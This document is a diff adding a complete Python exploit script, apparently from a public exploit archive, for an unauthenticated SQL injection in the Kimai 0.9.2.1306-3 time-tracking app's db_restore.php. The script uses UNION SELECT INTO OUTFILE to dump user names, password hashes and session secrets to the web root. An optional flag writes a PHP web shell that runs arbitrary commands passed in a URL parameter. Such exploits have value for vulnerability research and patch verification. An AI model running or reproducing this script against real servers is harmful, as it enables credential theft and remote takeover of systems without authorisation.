@@ -1,0 +1,92 @@
+# Exploit Title: Kimai 0.9.2.1306-3 SQLi
+# Date: 05/20/2013
+# Exploit Author: drone (@dronesec)
+# Vendor Homepage: http://www.kimai.org/
+# Software Link: https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip 
+# Version: 0.9.2.1306-3
+# Fixed in: source repositories (https://github.com/kimai/kimai)
+# Tested on: Windows XP SP3, Ubuntu 12.04 (apparmor disabled)
+
+"""
+    This doesn't even require authentication to the
+    web app, as the file is accessible to any user.
+
+    Modify paths accordingly if running against Windows
+
+    @dronesec
+"""
+from argparse import ArgumentParser
+import string
+import random
+import urllib2
+import sys
+import re
+
+def webshell(options, id):
+    """ dat webshell
+    """
+    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+    sqli = ('http://{0}/kimai/db_restore.php?dates%5B%5D={1}_kimai_var%20UNION'
+    '%20SELECT%20\'<?php%20system($_GET["rr"]);?>\'%20FROM%20kimai_usr'
+    '%20INTO%20OUTFILE%20\'{2}/{3}.php\';--%20&submit=recover')
+
+    urllib2.urlopen(sqli.format(options.ip, id, options.path, shell))
+    print '[!] Shell dropped.  Go hit http://%s/kimai/%s.php?rr=ls'%(options.ip, shell)
+
+def fetch_id(options):
+    id = None
+    try:
+        page = urllib2.urlopen('http://%s/kimai/db_restore.php'%options.ip).read()
+        id = re.findall('name="dates\[\]" value=\"(.*?)\">', page)[0]
+    except: pass
+    return id
+
+def run(options):
+    # poll URL for valid backup id
+    id = None
+    while id is None:
+        id = fetch_id(options)
+        if id is None:
+            print '[-] No backups found, creating one...'
+            urllib2.urlopen('http://%s/kimai/db_restore.php?submit=create+backup'%options.ip)
+
+    print '[!] Using backup id', id
+
+    if options.shell:
+        return webshell(options, id)
+
+    print '[!] Running queries...'
+
+    # execute sqli
+    sqli = ('http://{0}/kimai/db_restore.php?dates%5B%5D={1}_kimai_var%20UNION'
+    '%20SELECT%20{3}%20FROM%20kimai_usr%20INTO%20OUTFILE%20\'{2}/{3}\';--%20&submit=recover')
+
+    urllib2.urlopen(sqli.format(options.ip, id, options.path, 'usr_name'))
+
+    # execute sqli; hashes
+    urllib2.urlopen(sqli.format(options.ip, id, options.path, 'pw'))
+
+    # get sessions
+    urllib2.urlopen(sqli.format(options.ip, id, options.path, 'secure'))
+
+    print '[!] Go grab your files:\n\t{0}/usr_names\n\t{0}/pw\n\t{0}/secure'\
+                    .format(options.path)
+
+def parse():
+    parser = ArgumentParser()
+    parser.add_argument('-i', help='server address', action='store', dest='ip')
+    parser.add_argument('-p', help='path to dump files (otherwise guesses /var/www/kimai)',
+                        action='store',default='/var/www/kimai', dest='path')
+    parser.add_argument('-w', help='web shell', action='store_true', dest='shell')
+
+    options = parser.parse_args()
+
+    if not options.ip:
+        parser.print_help()
+        sys.exit(1)
+
+    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+    return options
+
+if __name__ == "__main__":
+    run(parse())
